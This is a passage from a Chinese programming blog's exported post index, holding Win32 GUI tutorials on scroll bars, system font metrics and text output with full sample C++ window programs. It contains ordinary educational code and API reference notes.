si.fMask = SIF_ALL; GetScrollInfo(hWnd,SB_VERT,&amp;si); iVertPos = si.nPos; //获取滚动条开始打印的位置 //ps.rcPaint.top 无效矩形的顶位置 iPaintBeg = max(0, iVertPos + ps.rcPaint.top / cyChar); //获取滚动条结束打印的位置 //ps.rcPaint.bottom无效矩形的底位置 iPaintEnd = min(MAX_LINE - 1, iVertPos + ps.rcPaint.bottom / cyChar); // TODO: 在此处添加使用 hdc 的任何绘图代码... for (int i = iPaintBeg, temp; i &lt; iPaintEnd; i++) &#123; x = 0; y = (i - iVertPos) * cyChar; //SetScrollPos(hWnd, SB_VERT, y, TRUE); TextOut(hdc, x, y, szBuffer[i], lstrlen(szBuffer[i])); &#125; EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"滚动条","slug":"pwcp008-滚动条","date":"2021-06-01T04:05:13.000Z","updated":"2021-06-01T11:55:39.444Z","comments":true,"path":"2021/06/01/pwcp008-滚动条/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/01/pwcp008-滚动条/","excerpt":"","text":"滚动条 在CreateWindow中加入WS_VSCROLL 添加WM_VSCROLL消息 设置滑块大小 设置滑块位置 更新客户区 WS_VSCROLL垂直滚动条 12HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW | WS_VSCROLL, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); WS_HSCROLL水平滚动条 12HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW | WS_HSCROLL, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); WM_VSCROLL消息 SB_PAGEDOWN 向下滚动一页 SB_LINEDOWN 向下滚动一行 SB_PAGEUP 向上滚动一页 SB_LINEUP 向上滚动一行 SB_TOP 滚动到顶端 SB_BOTTOM 滚动到底部 SB_THUMBPOSITION 用户有拖动滚动框 （滑块），并释放鼠标按钮。HIWORD 指示在拖动操作结束时滚动框的位置。 SB_THUMBTRACK 用户正在拖动滚动框。直到用户释放鼠标按钮，反复发送此邮件。HIWORD 指示滚动框已被拖动到的位置。 1234567891011121314151617181920212223242526case WM_VSCROLL: switch (LOWORD(wParam)) //取wParam低位 &#123; case SB_LINEUP: //向上滚动一行 iVscrollPos -= 1; break; case SB_LINEDOWN: //向下滚动一行 iVscrollPos += 1; break; case SB_PAGEDOWN: //向下滚动一页 iVscrollPos += cyClient / cyChar; break; case SB_PAGEUP: //向上滚动一页 iVscrollPos -= cyClient / cyChar; break; case SB_THUMBTRACK: //按下鼠标拖动滑块 iVscrollPos = HIWORD(wParam);//获取高位,滑块的位置 break; &#125; iVscrollPos = max(0, min(iVscrollPos, MAX_LINE - 1)); //如果不等于当前滑块位置 if(iVscrollPos != GetScrollPos(hWnd,SB_VERT)) SetScrollPos(hWnd, SB_VERT, iVscrollPos, TRUE); InvalidateRect(hWnd,NULL,TRUE); break; SetScrollRange 函数设置所指定滚动条范围的最小值和最大值 1234567BOOL SetScrollRange(HWND hWnd, // 窗口句柄int nBar, // 滚动条类型int nMinPos, // 滚动条的最小位置int nMaxPos, // 滚动条的最大位置BOOL bRedraw // 重绘标志); 1SetScrollRange(hWnd,SB_VERT,0, MAX_LINE - 1,FALSE); GetScrollPos 获取指定滚动条中滚动按钮的当前位置 hWnd：根据参数nBar值，处理滚动条控制或带有标准滚动条窗体。 nBar：指定滚动条将被检查。 SB_HORZ：水平滚动条 SB_VERT：垂直滚动条 1GetScrollPos(hWnd,SB_VERT); SetScrollPos 用于设置所指定滚动条中的滚动按钮的位置。 123456int SetScrollPos(HWNDhWnd, //窗体句柄intnBar, //滚动条intnPos, //滚动条的新位置BOOLbRedraw // 重绘标志); SB_HORZ：水平滚动条 SB_VERT：垂直滚动条 1SetScrollPos(hWnd, SB_VERT, iVscrollPos, TRUE); InvalidateRect 使整个窗口无效 一般用来重画窗口,触发WM_PAINT消息 向指定的窗体更新区域添加一个矩形，然后窗体跟新区域的这一部分将被重新绘制。 12345BOOL InvalidateRect(HWND hWnd, // 窗口句柄CONST RECT *lpRect, // 矩形指针变量BOOL bErase //是否重画); lpRect：如果为NULL，全部的窗口客户区域将被增加到更新区域中。 UpdateWindow 更新指定窗口的客户区 123BOOL UpdateWindow(HWND hWnd // 窗口的句柄); WM_SIZE 当窗口大小发生改变时触发消息 123456case WM_SIZE: //获取客户区的高度 cyClient = HIWORD(lParam); //获取客户区的宽度 cxClient = LOWORD(lParam); break; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261// 滚动条.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"滚动条.h\"#define MAX_LOADSTRING 100#define MAX_LINE 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = NULL;// MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 //WS_VSCROLL 创建垂直滚动条 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW | WS_VSCROLL, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; static TEXTMETRIC tm; //获取字体信息 static int cxChar; //字体宽度 static int cyChar; //字体高度 HDC hdc; static int iVscrollPos; //当前滑块位置 TCHAR szBuffer[1024] = &#123; 0 &#125;; static int cyClient; //当前客户区高度大小 static int cxClient; //当前客户区宽度大小 switch (message) &#123; case WM_SIZE: //获取客户区的高度 cyClient = HIWORD(lParam); //获取客户区的宽度 cxClient = LOWORD(lParam); break; case WM_VSCROLL: //获取滚动条操作的消息 switch (LOWORD(wParam)) &#123; //向上滚动一行 case SB_LINEUP: iVscrollPos -= 1; break; //向下滚动一行 case SB_LINEDOWN: iVscrollPos += 1; break; //向下滚动一页 case SB_PAGEDOWN: iVscrollPos += cyClient / cyChar; break; //向上滚动一页 case SB_PAGEUP: iVscrollPos -= cyClient / cyChar; break; //拖动滑块时 case SB_THUMBTRACK: //拖动滑块时,获取滑块位置,在wParam的高位 iVscrollPos = HIWORD(wParam); break; &#125; //最小是0,最大是MAX_LINE - 1 iVscrollPos = max(0, min(iVscrollPos, MAX_LINE - 1)); //如果当前滑块位置不等于iVscrollPos if(iVscrollPos != GetScrollPos(hWnd,SB_VERT)) SetScrollPos(hWnd, SB_VERT, iVscrollPos, TRUE); InvalidateRect(hWnd,NULL,TRUE); break; case WM_CREATE: hdc = GetDC(hWnd); GetTextMetrics(hdc, &amp;tm); cxChar = tm.tmAveCharWidth; cyChar = tm.tmHeight + tm.tmExternalLeading; ReleaseDC(hWnd,hdc); //当前滑块默认为0 iVscrollPos = 0; //设置滚动条大小 SetScrollRange(hWnd,SB_VERT,0, MAX_LINE - 1,FALSE); //设置滑块位置 SetScrollPos(hWnd,SB_VERT,iVscrollPos,TRUE); break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; int x; int y; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... for (int i = 0, temp; i &lt; MAX_LINE; i++) &#123; x = 0; if (iVscrollPos &gt;= MAX_LINE - cyClient/cyChar) &#123; y = (i - (MAX_LINE - cyClient / cyChar)) * cyChar; //SetScrollPos(hWnd, SB_VERT, y, TRUE); &#125; else &#123; y = (i - iVscrollPos) * cyChar; &#125; _sntprintf(szBuffer,1024,TEXT(\"Hello %d \"),i + 1); TextOut(hdc, x, y,szBuffer,lstrlen(szBuffer)); &#125; EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"系统字体","slug":"pwcp007-系统字体","date":"2021-05-31T11:26:57.000Z","updated":"2021-06-08T05:12:26.228Z","comments":true,"path":"2021/05/31/pwcp007-系统字体/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/31/pwcp007-系统字体/","excerpt":"","text":"系统字体 TEXTMETRIC字体信息结构 12345678910111213141516171819202122typedef struct tagTEXTMETRIC &#123; LONG tmHeight; //字符高度LONG tmAscent; //字符上部高度(基线以上)LONG tmDescent; //字符下部高度(基线以下)LONG tmInternalLeading, //由tmHeight定义的字符高度的顶部空间数目LONG tmExternalLeading, //夹在两行之间的空间数目LONG tmAveCharWidth, //平均字符宽度LONG tmMaxCharWidth, //最宽字符的宽度LONG tmWeight; //字体的粗细轻重程度LONG tmOverhang, //加入某些拼接字体上的附加高度LONG tmDigitizedAspectX, //字体设计所针对的设备水平方向LONG tmDigitizedAspectY, //字体设计所针对的设备垂直方向BCHAR tmFirstChar; //为字体定义的第一个字符BCHAR tmLastChar; //为字体定义的最后一个字符BCHAR tmDefaultChar; //字体中所没有字符的替代字符BCHAR tmBreakChar; //用于拆字的字符BYTE tmItalic, //字体为斜体时非零BYTE tmUnderlined, //字体为下划线时非零BYTE tmStruckOut, //字体被删去时非零BYTE tmPitchAndFamily, //字体间距(低4位)和族(高4位)BYTE tmCharSet; //字体的字符集&#125; TEXTMETRIC; GetTextMetrics 把程序当前的字体信息，存放到TEXTMETRIC 1BOOL GetTextMetrics(HDC hdc, LPTEXTMETRIC lptm)； hdc：设备环境句柄。 lptm：指向结构TEXTMETRIC的指针，该结构用于获得字体信息。 1GetTextMetrics(hdc, &amp;tm); GetSystemMetrics 1int WINAPI GetSystemMetrics( __in intnIndex); 只有一个参数，称之为「索引」，这个索引有75个标识符，通过设置不同的标识符就可以获取系统分辨率、窗体显示区域的宽度和高度、滚动条的宽度和高度。 1234//获取屏幕宽度cxScreen = GetSystemMetrics(SM_CXSCREEN);//获取屏幕高度cyScreen = GetSystemMetrics(SM_CYSCREEN); SetTextAlign 为指定设备环境设置文字对齐标志 1234UINT SetTextAlign(HDC hdc, // 设备环境句柄UINT fMode // 文本对齐选项); 设置对齐方式为左对齐 SetTextAlign(hdc, TA_LEFT | TA_TOP); 设置对齐方式为右对齐 1SetTextAlign(hdc, TA_RIGHT | TA_TOP); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224// 系统字体.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"系统字体.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = NULL;//MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; static TEXTMETRIC tm; static int cxChar; //字符宽度 static int cyChar; //字符高度 static int cxCap; //一个字符的宽度 static int cxScreen, cyScreen;//屏幕宽度和高度 TCHAR szBuffer[1024] = &#123; 0 &#125;; int len; //字符串长度 HDC hdc; switch (message) &#123; case WM_CREATE: hdc = GetDC(hWnd); //把程序当前的字体信息，存放到tm GetTextMetrics(hdc, &amp;tm); //获取字符平均值 cxChar = tm.tmAveCharWidth; //获取字符高度 cyChar = tm.tmHeight + tm.tmExternalLeading + 10; //获取一个字符的宽度 cxCap = (tm.tmPitchAndFamily &amp; 1 ? 3 : 2) * cxChar / 2; //获取屏幕宽度 cxScreen = GetSystemMetrics(SM_CXSCREEN); //获取屏幕高度 cyScreen = GetSystemMetrics(SM_CYSCREEN); ReleaseDC(hWnd,hdc); break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... TextOut(hdc,0,0,TEXT(\"SM_CXSCREEN\"),lstrlen(TEXT(\"SM_CXSCREEN\"))); TextOut(hdc, cxCap * 30, 0, TEXT(\"屏幕宽度\"), lstrlen(TEXT(\"屏幕宽度\"))); //设置对齐方式为右对齐 SetTextAlign(hdc,TA_RIGHT|TA_TOP); len = _sntprintf(szBuffer,1024,TEXT(\"%d\"),cxScreen); TextOut(hdc, cxCap * 60, 0, szBuffer,len); //设置对齐方式为左对齐 SetTextAlign(hdc,TA_LEFT | TA_TOP); TextOut(hdc, 0, cyChar, TEXT(\"SM_CYSCREEN\"), lstrlen(TEXT(\"SM_CYSCREEN\"))); TextOut(hdc, cxCap * 30, cyChar, TEXT(\"屏幕高度\"), lstrlen(TEXT(\"屏幕高度\"))); //设置对齐方式为右对齐 SetTextAlign(hdc, TA_RIGHT | TA_TOP); len = _sntprintf(szBuffer, 1024, TEXT(\"%d\"), cyScreen); TextOut(hdc, cxCap * 60, cyChar, szBuffer, len); //设置对齐方式为左对齐 SetTextAlign(hdc, TA_LEFT | TA_TOP); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"文本输出","slug":"pwcp006-文本输出","date":"2021-05-31T10:15:56.000Z","updated":"2021-05-31T10:33:18.199Z","comments":true,"path":"2021/05/31/pwcp006-文本输出/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/31/pwcp006-文本输出/","excerpt":"","text":"文本输出 设备环境句柄 BeginPaint和EndPaint用于WM_PAINT 1234case WM_PAINT: HDC hdc = BeginPaint(hWnd, &amp;ps); ... EndPaint(hWnd, &amp;ps); GetDC和releaseDC可以用在任何位置 12345hdc = GetDC(hwnd);...releaseDC(hwnd,hdc); TextOut 用当前选择的字体、背景颜色和正文颜色将一个字符串写到指定位置 1234567BOOL TextOut(HDC hdc, // 设备描述表句柄int nXStart, // 字符串的开始位置 x坐标int nYStart, // 字符串的开始位置 y坐标LPCTSTR lpString, // 字符串int cbString // 字符串中字符的个数); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190// 通盘考虑.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"通盘考虑.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//(HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = NULL;//MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; const int iCharWidth = 18; switch (message) &#123; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); TCHAR szBuffer[1024] = &#123; 0 &#125;; // TODO: 在此处添加使用 hdc 的任何绘图代码... for (int i = 0; i &lt; 100; i++) &#123; _sntprintf(szBuffer,1024, TEXT(\"我爱你 %d\"),i + 1); TextOut(hdc, 0, iCharWidth * i,szBuffer , lstrlen(szBuffer)); &#125; EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"通盘考虑","slug":"pwcp005-通盘考虑","date":"2021-05-31T09:45:08.000Z","updated":"2021-05-31T10:16:31.903Z","comments":true,"path":"2021/05/31/pwcp005-通盘考虑/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/31/pwcp005-通盘考虑/","excerpt":"","text":"通盘考虑 Loadicon 加载图标，以供程序使用。 LoadCursor加载鼠标光标，以供程序使用。 GetStockObject 获取一个图形对象。在本例中是一个用来对窗口的背景进行重绘 的画刷。 RegisterClass 为应用程序的窗口注册一个窗口类。 MessageBox 显示消息框。 Create Window 基于窗口类创建一个窗口。 ShowWindow 在屏幕中显示窗口。 UpdateWindow 指示窗口对其自身进行重绘。 GetMessage 从消息队列获取消息。 TranslateMessage 翻译一些键盘消息。 DispatchMessage 将消息发送给窗口过程。 PlaySound 播放声音文件。 BeginPaint 标明窗口绘制开始。 GetClientRect 获取窗口客户区的尺寸。 DrawText 显示一个文本字符串。 EndPaint结束窗口绘制。 PostQuitMessage 将“退出”消息插入消息队列。 DefWindowProc 执行默认的消息处理。 大写标识符 匈牙利标记法 GetStockobject 获取预定义的备用笔、刷子、字体或者调色板的句柄。 1HGDIOBJ GetStockObject(int fnObject)； fnObject：指定对象的类型，该参数可取如下值之一； BLACK_BRUSH：黑色画刷；DKGRAY_BRUSH：暗灰色画刷； DC_BRUSH：在Windows98,Windows NT 5.0和以后版本中为纯颜色画刷，缺省色为白色，可以用SetDCBrushColor函数改变颜色，更多的信息参见以下的注释部分。 GRAY_BRUSH：灰色画刷笔； HOLLOW_BRUSH：空画刷（相当于NULL_BRUSH）； NULL_BRUSH：空画刷（相当于HOLLOW_BRUSH）； LTGRAY_BRUSH：亮灰色画刷； WHITE_BRUSH：白色画刷； BLACK_PEN：黑色钢笔； DC_PEN：在Windows98、Windows NT 5.0和以后版本中为纯色钢笔，缺省色为白色，使用SetDCPenColor函数可以改变色彩，更多的信息，参见下面的注释部分。 WHITE_PEN：白色钢笔； ANSI_FIXED_FONT：在Windows中为固定间距（等宽）系统字体； 